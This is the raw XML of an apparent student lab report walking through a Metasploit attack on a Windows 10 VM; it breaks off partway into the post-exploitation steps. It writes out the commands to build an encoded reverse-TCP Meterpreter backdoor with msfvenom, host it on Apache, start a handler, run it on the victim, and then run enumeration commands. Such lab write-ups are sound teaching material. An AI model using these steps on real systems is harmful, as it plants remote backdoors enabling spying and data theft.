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892" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Hacking Windows using Metasploit / Meterpreter - Post-Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E518FA" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965" w:rsidP="00E518FA">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Student Lab Report Template</w:t>
      </w:r>
      <w:r w:rsidR="00E518FA">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00E518FA">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00E518FA" w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E518FA" w:rsidRDefault="00E518FA" w:rsidP="00E518FA">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This white paper presents a practical walkthrough of post-exploitation techniques using the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Framework, primarily focusing on the Meterpreter payload. As part of the cybersecurity task, the goal was to successfully compromise a Windows 10 virtual machine, plant a backdoor, and leverage Meterpreter for further system enumeration, data extraction, and session control.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E518FA" w:rsidRPr="003A37CC" w:rsidRDefault="00E518FA" w:rsidP="00E518FA">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Objectives</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRPr="007932EA" w:rsidRDefault="00E518FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">- Craft a backdoor using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Host the payload on a web server using Apache</w:t>
      </w:r>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Deliver and execute the payload on the victim machine</w:t>
      </w:r>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Gain access using Meterpreter via reverse TCP</w:t>
      </w:r>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Perform post-exploitation: data extraction, screenshot, keystroke logging, and cleanup</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>1. Lab Setup Overview</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRPr="007932EA" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>- Attacker Machine: Kali Linux</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRPr="007932EA" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>- Victim Machine: Windows 10 Pro</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRDefault="00E93965">
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">- Network Type: NAT </w:t>
      </w:r>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>/ Host-only</w:t>
      </w:r>
      <w:r w:rsidR="00E518FA">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7D31A846" wp14:editId="49E6A11D">
            <wp:extent cx="4668655" cy="1546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8554" cy="156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B85">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2. Payload Creation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D95B85" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965" w:rsidP="003A37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A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Command Used:</w:t>
      </w:r>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>shikata_ga_na</w:t>
      </w:r>
      <w:r w:rsidR="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b "\x00" LHOST=196.168.XX.XXX</w:t>
      </w:r>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f exe &gt; /root/Desktop/Backdoor.exe</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D95B85" w:rsidRDefault="00E93965" w:rsidP="00D95B85">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>creenshot:</w:t>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="6175717" cy="1249680"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="2" name="Picture 2" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\2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SendAnywhere_178677\2n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8293" cy="137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892" w:rsidRDefault="00E35892"/>
    <w:p w:rsidR="00E35892" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>3. Start Apache Web Server and Host Payload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D95B85" w:rsidRDefault="00E93965" w:rsidP="003A37CC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Commands Used:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> service apache2 start</w:t>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3129915" cy="668020"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="5" name="Picture 5" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\3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SendAnywhere_178677\3r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915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892" w:rsidRDefault="00E93965" w:rsidP="003A37CC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pP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/www/html/share</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D95B85"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/root/Desktop/Backdoor.exe /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/www/html/share/</w:t>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D95B85">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4839335" cy="949325"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="6" name="Picture 6" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\4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wnloads\SendAnywhere_178677\4th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5B85" w:rsidRDefault="00E93965" w:rsidP="00D95B85">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>creenshot:</w:t>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="6073842" cy="2145030"/>
            <wp:effectExtent l="0" t="0" r="3175" b="7620"/>
            <wp:docPr id="7" name="Picture 7" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\5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wnloads\SendAnywhere_178677\5th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324" cy="223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B24" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965" w:rsidP="00AC1B24">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">4. Set Up </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> Handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AC1B24" w:rsidRPr="00AC1B24" w:rsidRDefault="00AC1B24" w:rsidP="00AC1B24">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4874260" cy="3355144"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="10" name="Picture 10" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\8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ELL\Downloads\SendAnywhere_178677\8th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48" cy="3373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B24" w:rsidRDefault="00E93965" w:rsidP="003A37CC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Commands Used in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>use exploit/multi/handler</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>set payload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 w:rsidR="00AC1B24">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5394960" cy="638810"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="11" name="Picture 11" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\9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SendAnywhere_178677\9th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58" cy="65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1B24">
        <w:lastRenderedPageBreak/>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5838092" cy="2046588"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="13" name="Picture 13" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\10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SendAnywhere_178677\10th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776" cy="206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8FA" w:rsidRDefault="00AC1B24" w:rsidP="00AC1B24">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>set LHOST=196.168.XX.XXX</w:t>
      </w:r>
      <w:r w:rsidR="00E93965">
        <w:br/>
        <w:t>set LPORT=4444</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5829280" cy="2609215"/>
            <wp:effectExtent l="0" t="0" r="635" b="635"/>
            <wp:docPr id="14" name="Picture 14" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\11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SendAnywhere_178677\11th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153" cy="263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892" w:rsidRDefault="00E93965" w:rsidP="003A37CC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">exploit -j </w:t>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:t>z</w:t>
      </w:r>
      <w:r w:rsidR="003A37CC">
        <w:br/>
      </w:r>
      <w:r w:rsidR="003A37CC">
        <w:t>Screenshot:</w:t>
      </w:r>
      <w:r w:rsidR="003A37CC">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5774788" cy="1455345"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="15" name="Picture 15" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\12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SendAnywhere_178677\12th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432" cy="149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892" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>5. On Windows VM: Download and Run Backdoor.exe</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AC1B24" w:rsidRDefault="00E93965" w:rsidP="00AC1B24">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:t>Actions:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Open browser and visit: http://&lt;Kali_IP&gt;/share/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Download Backdoor.exe</w:t>
      </w:r>
      <w:r w:rsidR="003A37CC">
        <w:br/>
      </w:r>
      <w:r w:rsidR="003A37CC">
        <w:t>Screenshot:</w:t>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC1B24">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="6196818" cy="2433320"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="16" name="Picture 16" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\6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SendAnywhere_178677\6th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180" cy="245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1B24">
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Run it and accept warnings</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRDefault="00AC1B24" w:rsidP="003A37CC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5580555" cy="2591525"/>
            <wp:effectExtent l="0" t="0" r="1270" b="0"/>
            <wp:docPr id="17" name="Picture 17" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\7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SendAnywhere_178677\7th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189" cy="2619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892" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>6. Meterpreter Se</w:t>
      </w:r>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>ssion Opened</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRDefault="00E93965" w:rsidP="003A37CC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshot:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00D2631C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4986670" cy="1853546"/>
            <wp:effectExtent l="0" t="0" r="4445" b="0"/>
            <wp:docPr id="18" name="Picture 18" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\13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SendAnywhere_178677\13th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973" cy="187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892" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>7. Post-Exploitation Activities</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>a. View System Informatio</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Command: sysinfo</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRPr="00DA5795" w:rsidRDefault="007932EA" w:rsidP="00DA5795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>
            <wp:extent cx="3613446" cy="1230923"/>
            <wp:effectExtent l="0" t="0" r="6350" b="7620"/>
            <wp:docPr id="19" name="Picture 19" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\16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SendAnywhere_178677\16th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442" cy="12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795">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A37CC" w:rsidRDefault="003A37CC" w:rsidP="003A37CC">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t>. Get Log</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t>ged-in Userna</w:t>
      </w:r>
      <w:r>
        <w:t>me</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>getuid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3221355" cy="478155"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="29" name="Picture 29" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\17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DELL\Downloads\SendAnywhere_178677\17th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892" w:rsidRPr="003A37CC" w:rsidRDefault="003A37CC" w:rsidP="003A37CC">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t>. Navigate to Desktop and List Files</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:br/>
        <w:t>Comman</w:t>
      </w:r>
      <w:r>
        <w:t>d: cd Desktop → ls</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4220308" cy="1236345"/>
            <wp:effectExtent l="0" t="0" r="8890" b="1905"/>
            <wp:docPr id="30" name="Picture 30" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\14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DELL\Downloads\SendAnywhere_178677\14th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22" cy="1331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795" w:rsidRDefault="003A37CC" w:rsidP="00DA5795">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>d</w:t>
      </w:r>
